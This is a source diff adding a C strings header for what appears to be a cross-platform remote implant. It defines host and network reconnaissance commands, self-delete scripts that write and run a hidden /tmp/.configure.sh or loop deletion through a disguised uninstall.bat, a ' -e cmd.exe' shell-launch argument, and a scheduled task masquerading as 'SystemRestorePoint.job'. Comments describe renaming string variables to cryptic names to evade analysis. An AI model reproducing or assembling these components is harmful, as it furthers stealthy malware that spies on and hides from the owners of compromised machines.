@@ -1,0 +1,229 @@
+// main.c Strings========================================
+
+// Note that we use a C code style for comments...
+// Recommend that we list the name of the sourcecode file that contains/uses
+// the string like we did above.
+// 
+// The "#define n" portion below is standard.
+//
+//        Name of String     String contents enclosed in double quotes.
+//        |                  |
+//        |                  |
+//        |                  |
+//        V                  V
+// main.c
+
+//To remove some of the stringVaraible names for Solaris builds, I had to realy change the
+//  variable name of the string, for instance:
+//            "usageString" is now "usb"
+//            "commandString" is now "cdS137", ...
+//  This was necessary due to Sun's limited stripping capability via "strip"...
+
+
+//#define n insufficient_permissions " Insufficient permissions. Try again knucklehead.\n"
+#define n inp183Aq " Insufficient permissions. Try again...\n"
+
+//#define n cmdLineOptionFlags "a:cp:d:hI:i:j:K:k:s:t:"
+#define n cIures4j "a:cD:d:hi:j:K:k:P:p:S:s:t:"
+#define n oe1	"Option error"
+#define n oe2	"File not found"
+#define n oe3	"ID too short"
+#define n oe4	"Too many characters for address"
+//#define n proc_uptime "/proc/uptime"
+#define n uPasg18a "/proc/uptime"
+//cmd_str = "ps -ef"
+#define n bws1 "tasklist"
+//cmd_str = "ps -ef"
+#define n bus1 "ps -ef"
+//prc1 = "proc"
+#define n prc1 "proc"
+//prc2 = "stat"
+#define n prc2 "stat"
+//prc3 = "\npid             state    ppid            pgrp            session         command\n"
+#define n prc3 "\npid   state ppid  pgrp  session command\n"  
+//cmd_str = "ipconfig /all"
+#define n bws2 "ipconfig /all"
+//cmd_str = "/sbin/ifconfig -a"
+#define n bus2 "/sbin/ifconfig -a"
+#define n ifc1 "error fetching interface information"
+#define n ifc2 "inet6 addr"
+#define n ifc3 "Scope"
+#define n ifc4 "Global"
+#define n ifc5 "Link"
+#define n ifc6 "Site"
+#define n ifc7 "Compat"
+#define n ifc8 "Host"
+#define n ifc9 "Unknown"
+#define n ifc10 "UP "
+#define n ifc11 "LOOP "
+#define n ifc12 "BCAST "
+#define n ifc13 "RUNNING "
+#define n ifc14 "MCAST "
+#define n ifc15 "NOARP "
+#define n ifc16 "PROMISC "
+#define n ifc17 "P2P "
+#define n ifc18 "DYNAMIC "
+#define n ifc19 "HW addr"
+#define n ifc20 "MTU"
+#define n ifc21 "inet addr"
+#define n ifc22 "bcast addr"
+#define n ifc23 "netmask"
+#define n ifc24 "P-t-P addr"
+#define n ifc25 "sock_ntop_host: unknown AF_xxx"
+//cmd_str = "netstat -rn"
+#define n bb1 "netstat -rn"
+//ntsrn1 = "/proc/net/route"
+#define n ntsrn1 "/proc/net/route"
+//ntsrn2 = "\n Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface\n"
+#define n ntsrn2 "\n Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface\n"
+//ntsan1 = "/proc/net/tcp"
+#define n ntsan1 "/proc/net/tcp"
+#define n ntsan2 "/proc/net/tcp6"
+#define n ntsan3 "/proc/net/udp"
+#define n ntsan4 "/proc/net/udp6"
+#define n ntsan5 "/proc/net/raw"
+#define n ntsan6 "/proc/net/raw6"
+#define n ntsan7 "\nActive Internet connections (servers and established)"
+#define n ntsan8 "Local Address"
+#define n ntsan9 "Foreign Address"
+#define n ntsan10 "raw"
+#define n ntsan11 "raw6"
+#define n ntsan12 "udp"
+#define n ntsan13 "udp6"
+#define n ntsan14 "ESTABLISHED"
+#define n ntsan15 "UNKNOWN"
+#define n ntsan16 "tcp6"
+#define n ntsan17 "tcp"
+#define n ntsan18 "\n\n\nReduced allocation space"
+#define n ntsan19 "occurring soon...\n\n\n"
+#define n ntsan20 "\n\n\nTruncation may soon occur.     Will allocate more memory"
+#define n ntsan21 "SYN_SENT"
+#define n ntsan22 "SYN_RECV"
+#define n ntsan23 "FIN_WAIT1"
+#define n ntsan24 "FIN_WAIT2"
+#define n ntsan25 "TIME_WAIT"
+#define n ntsan26 "CLOSE"
+#define n ntsan27 "CLOSE_WAIT"
+#define n ntsan28 "LAST_ACK"
+#define n ntsan29 "LISTEN"
+#define n ntsan30 "CLOSING"
+#define n ntsan31 "UNKNOWN"
+//cmd_str = "netstat -antu"
+#define n bb2 "netstat -antu"
+#define n bb22 "netstat -anf inet; netstat -anf inet6"
+#define n win_netstat_an "netstat -an"
+//readlink("/proc/self/exe")
+#define n sdp "/proc/self/exe"
+//Self Delete Files	
+#define n sdc ".config"
+#define n sdl ".log"
+#define n sde "Path name too long"
+#define n sdf "DNS server address missing"
+#define n sddp "/var"
+//sd script shell
+#define n sdss "/bin/sh"
+//solaris shell script line 1
+#define n sdsl1 "#!/bin/sh\n"
+//solaris shell script line 2 for sol 8
+#define n sds8l2 "/bin/rm -f %s/%s\n"
+//solaris shell script line 2 for sol 9 and 10
+#define n sds9l2 "/bin/rm -f %s\n"
+//solaris shell script line 3
+#define n sdsl3 "/bin/rm -f $0\n"
+//solaris script filename
+#define n sdsfn "/tmp/.configure.sh"
+//solaris chmod script
+#define n sdsfc "chmod +x /tmp/.configure.sh"
+//solaris exec script
+#define n sdsfe "/tmp/.configure.sh &"
+//windows self delete script line1
+#define n sdw1 ":rp\n"
+//windows self delete script line2
+#define n sdw2 "del \"%s\" \n"
+//windows self delete script line3
+#define n sdw3 "if exist \"%s\" goto rp\n"
+//windows self delete script line4
+#define n sdw4 "del \"uninstall.bat\"\n"
+//windows self delete script name
+#define n sdwsn "uninstall.bat"
+//windows timer file
+//c:\\windows\\uninstallreadme.txt
+#define n sdwtf "%WINDIR%\\uninstallreadme.txt"
+
+//winshell.c
+#define n utlan01 "util.exe"
+//windows 2k not supported process list
+#define n w2nsupst "Not supported"
+// to be added on windows shell
+#define n w32tsst "32.exe"
+//launchshell.c
+#define n cmexst " -e cmd.exe"
+
+// Windows Strings========================================
+
+// Note that we use a C code style for comments...
+// Recommend that we list the name of the sourcecode file that contains/uses
+// the string like we did above.
+// 
+// The "#define w" portion below is standard for windows string with wide characters.
+//
+//        Name of String     String contents enclosed in double quotes.
+//        |                  |
+//        |                  |
+//        |                  |
+//        V                  V
+// main.c
+//#define w system_restore "SystemRestorePoint"
+#define w sresA12 "SystemRestorePoint"
+#define w sresjBa12 "SystemRestorePoint.job"
+#define w sresjBa12p "%WINDIR%\\tasks\\SystemRestorePoint.job"
+
+// Polar SSL strings
+
+#define n pol_bc "-----BEGIN CERTIFICATE-----"
+#define n pol_ec "-----END CERTIFICATE-----"
+#define n pol_bxcrl "-----BEGIN X509 CRL-----"
+#define n pol_excrl "-----END X509 CRL-----"
+#define n pol_brpk "-----BEGIN RSA PRIVATE KEY-----"
+#define n pol_erpk "-----END RSA PRIVATE KEY-----"
+#define n pol_mc1 "Proc-Type: 4,ENCRYPTED"
+#define n pol_mc2 "DEK-Info: DES-EDE3-CBC,"
+#define n pol_ema "emailAddress="
+#define n pol_cv "%scert. version : %d\n"
+#define n pol_sn "%sserial number : "
+#define n pol_in "\n%sissuer name   : "
+#define n pol_subn "\n%ssubject name  : "
+#define n pol_io "\n%sissued  on    : %04d-%02d-%02d %02d:%02d:%02d"
+#define n pol_expo "\n%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d"
+#define n pol_susr "\n%ssigned using  : RSA+"
+#define n pol_h1 "MD2"
+#define n pol_h2 "MD4"
+#define n pol_h3 "MD5"
+#define n pol_h4 "SHA1"
+#define n pol_h5 "SHA224"
+#define n pol_h6 "SHA256"
+#define n pol_h7 "SHA384"
+#define n pol_h8 "SHA512"
+#define n pol_rks "\n%sRSA key size  : %d bits\n"
+#define n pol_crlv "%sCRL version   : %d"
+#define n pol_rc "\n%sRevoked certificates:"
+#define n pol_rd " revocation date: "  "%04d-%02d-%02d %02d:%02d:%02d"
+
+#define n pol_r1 "SSL_RSA_RC4_128_MD5"
+#define n pol_r2 "SSL_RSA_RC4_128_SHA"
+#define n pol_r3 "SSL_RSA_DES_168_SHA"
+#define n pol_r4 "SSL_EDH_RSA_DES_168_SHA"
+#define n pol_r5 "SSL_RSA_AES_128_SHA"
+#define n pol_r6 "SSL_EDH_RSA_AES_128_SHA"
+#define n pol_r7 "SSL_RSA_AES_256_SHA"
+#define n pol_r8 "SSL_EDH_RSA_AES_256_SHA"
+#define n pol_r9 "SSL_RSA_CAMELLIA_128_SHA"
+#define n pol_r10 "SSL_EDH_RSA_CAMELLIA_128_SHA"
+#define n pol_r11 "SSL_RSA_CAMELLIA_256_SHA"
+#define n pol_r12 "SSL_EDH_RSA_CAMELLIA_256_SHA"
+#define n pol_ms "master secret"
+#define n pol_ke "key expansion"
+#define n pol_cf "client finished"
+#define n pol_sf "server finished"
+
+#define n ccat_err "Hey, outBufferSize is %d, but len*3 is %d\n"
